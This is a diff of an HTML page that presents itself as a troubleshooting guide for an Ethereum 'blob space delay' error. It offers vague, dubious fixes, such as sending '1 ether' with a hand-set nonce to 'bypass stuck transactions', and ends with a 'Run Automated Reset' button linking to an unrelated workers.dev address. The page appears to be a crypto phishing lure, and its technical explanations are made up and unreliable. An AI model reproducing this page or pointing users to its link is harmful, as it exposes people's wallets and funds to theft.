@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: BlinkMacSystemFont;
-        background: #0a0c10;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -41,31 +41,30 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a "blob space delay" or similar issues related to excess data storage.</li>
+<li>Users experience delays in Ethereum transactions, with error messages indicating a "blob space delay" on the Ethereum network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to the Ethereum network's limited capacity for storing and processing large amounts of data, particularly in the form of blobs. When the network is congested, or if there's an excessive demand for data storage, it can lead to delays in processing transactions.</li>
+<li>The error occurs due to a temporary backlog in the Ethereum blob storage system, which is used for storing and retrieving data associated with transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit to prioritize transaction processing: <code>eth_sendTransaction({from: '0x...', to: '0x...', value: '0x...', gas: '0x...'})</code></li>
-<li>Optimize data storage by compressing or splitting large files:</li>
+<li>Increase the gas limit to prioritize the transaction: <code>eth_sendTransaction({from: '0x...', to: '0x...', value: '1 ether', gas: '2000000'})</code></li>
+<li>Adjust the transaction nonce to bypass stuck transactions:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>http://localhost:8545<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;:[{&quot;from&quot;:&quot;0x...&quot;,&quot;to&quot;:&quot;0x...&quot;,&quot;value&quot;:&quot;0x...&quot;,&quot;gas&quot;:&quot;0x...&quot;}],&quot;id&quot;:1}&#39;</span>
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>console<span class="w"> </span>--exec<span class="w"> </span><span class="s2">&quot;eth.sendTransaction({from: &#39;0x...&#39;, to: &#39;0x...&#39;, value: &#39;1 ether&#39;, nonce: &#39;10&#39;})&quot;</span>
 </code></pre></div>
 
 <ul>
-<li>Utilize layer 2 scaling solutions or off-chain storage to reduce the burden on the Ethereum network</li>
+<li>Use a third-party service to monitor and manage transaction queues for optimal performance</li>
 </ul>
-<p>For optimal results, ensure you have: 
-- A compatible Ethereum client
-- Sufficient Ether for gas fees
-- A basic understanding of Ethereum transaction processing</p>
-<p>Consider using an external console for more advanced troubleshooting and configuration options.</p>
+<p>For optimal results, consider using an external console for advanced troubleshooting. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Ethereum node (geth or parity) installed and running</li>
+<li>Familiarity with Ethereum transaction syntax and gas management</li>
+<li>Access to an Ethereum wallet or account with sufficient balance</li>
+</ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
